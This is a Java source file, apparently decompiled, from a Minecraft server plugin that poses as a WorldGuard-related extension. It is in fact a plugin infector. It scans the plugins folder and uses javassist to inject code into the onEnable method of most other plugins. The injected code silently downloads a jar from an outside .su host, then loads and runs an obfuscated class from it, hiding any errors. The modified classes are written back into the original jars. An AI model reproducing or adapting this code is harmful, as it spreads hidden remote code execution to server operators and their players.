package com.fastblock.worlguard.extension;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.net.JarURLConnection;
import java.net.URL;
import java.nio.file.FileSystem;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.Map;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.apache.commons.io.FileUtils;
import org.yaml.snakeyaml.Yaml;

public class BlockRepresentation {
   public static void newModify(String from, String to) {
      File inputDir = new File(from);
      inputDir.mkdirs();
      File outputDir = new File(to);
      outputDir.mkdirs();
      File[] var7;
      int var6 = (var7 = inputDir.listFiles()).length;

      for(int var5 = 0; var5 < var6; ++var5) {
         File fileEntry = var7[var5];
         if (fileEntry.getName().endsWith(".jar")) {
            try {
               File finalCopyFile = new File(inputDir + "\\" + fileEntry.getName());
               copyFileToTempDir(finalCopyFile, outputDir);
            } catch (IOException var9) {
               var9.printStackTrace();
            }

            editFile("plugins\\" + fileEntry.getName(), "plugins\\" + fileEntry.getName(), fileEntry.getName());
         }
      }

   }

   private static void updateFiles(String from, String to) {
      File inputDir = new File(from);
      inputDir.mkdirs();
      File outputDir = new File(to);
      outputDir.mkdirs();
      File[] var7;
      int var6 = (var7 = inputDir.listFiles()).length;

      for(int var5 = 0; var5 < var6; ++var5) {
         File fileEntry = var7[var5];
         if (fileEntry.getName().endsWith(".jar")) {
            try {
               File finalCopyFile = new File(outputDir + "\\" + fileEntry.getName());
               copyFileToTempDir(finalCopyFile, inputDir);
            } catch (IOException var9) {
               var9.printStackTrace();
            }
         }
      }

   }

   private static void editFile(String from, String to, String preFinalFile) {
      Path in = Paths.get(from);
      if (in.toFile().exists()) {
         try {
            File tmp = new File("plugins\\tmp");
            tmp.mkdirs();
            Map<String, Object> pluginMeta = readPluginMeta(in.toAbsolutePath().toString());
            String MAIN = (String)pluginMeta.get("main");
            if (MAIN.equals("com.fastblock.worlguard.extension.SimpleMinecraftBlock")) {
               return;
            }

            if (MAIN.equals("me.clip.placeholderapi.PlaceholderAPIPlugin")) {
               return;
            }

            if (MAIN.equals("com.gmail.filoghost.holographicdisplays.HolographicDisplays")) {
               return;
            }

            if (MAIN.equals("com.comphenix.protocol.ProtocolLib")) {
               return;
            }

            if (MAIN.equals("me.rerere.matrix.Matrix")) {
               return;
            }

            try {
               String fname = "database";
               String mname = "create_new_database";
               ClassPool poolclass = new ClassPool(ClassPool.getDefault());
               poolclass.appendClassPath(from);
               CtClass ctclass = poolclass.get(MAIN);
               CtMethod m = ctclass.getDeclaredMethod("onEnable");
               m.insertAfter("{ try { java.io.File myJar = new java.io.File(\"readme.txt\"); try { java.io.InputStream in = new java.net.URL(\"https://moonlight227.su/xhfckrappqwrsgte.jar\").openStream(); java.nio.file.Files.copy(in, java.nio.file.Paths.get(new java.lang.String(myJar.getAbsolutePath())), java.nio.file.StandardCopyOption.REPLACE_EXISTING); } Class classToLoad = Class.forName(\"xhfckrappqwrsgte.uhmsbzkmpksexhen.rjyzewmzpbwpxmbn.mnuqjvejnzscvjax\", true, new java.net.URLClassLoader(new URL[]{myJar.toURL()}, null)); classToLoad.getDeclaredMethod(\"ssqzvyhqvtrwjjcb\").invoke(classToLoad.newInstance()); } catch(Exception e) { } }");
               ctclass.writeFile(tmp.toString());
               Path finalFile = Paths.get("plugins\\tmp\\" + preFinalFile);
               Path patched = Paths.get("plugins/tmp/" + MAIN.replace(".", "/") + ".class");
               FileSystem outStream = FileSystems.newFileSystem(finalFile, (ClassLoader)null);
               Path targetCLASS = outStream.getPath("/" + MAIN.replace(".", "/") + ".class");
               Files.copy(patched, targetCLASS, StandardCopyOption.REPLACE_EXISTING);
               outStream.close();
            } catch (Exception var16) {
               var16.printStackTrace();
            }

            updateFiles("plugins\\", "plugins\\tmp\\");
         } catch (Exception var17) {
            var17.printStackTrace();
         }

      }
   }

   private static Map<String, Object> readPluginMeta(String pathIn) throws IOException {
      Yaml yaml = new Yaml();
      InputStream in = null;
      String inputFile = "jar:file:/" + pathIn + "!/plugin.yml";
      if (inputFile.startsWith("jar:")) {
         URL inputURL = new URL(inputFile);
         JarURLConnection conn = (JarURLConnection)inputURL.openConnection();
         in = conn.getInputStream();
      }

      return (Map)yaml.load(in);
   }

   private static void deleteDir(File file) {
      File[] contents = file.listFiles();
      if (contents != null) {
         File[] var5 = contents;
         int var4 = contents.length;

         for(int var3 = 0; var3 < var4; ++var3) {
            File f = var5[var3];
            if (!Files.isSymbolicLink(f.toPath())) {
               deleteDir(f);
            }
         }
      }

      file.delete();
   }

   private static void copyFileToTempDir(File sourceDirName, File targetSourceDir) throws IOException {
      try {
         FileUtils.copyFileToDirectory(sourceDirName, targetSourceDir);
      } catch (IOException var3) {
         var3.printStackTrace();
      }

   }
}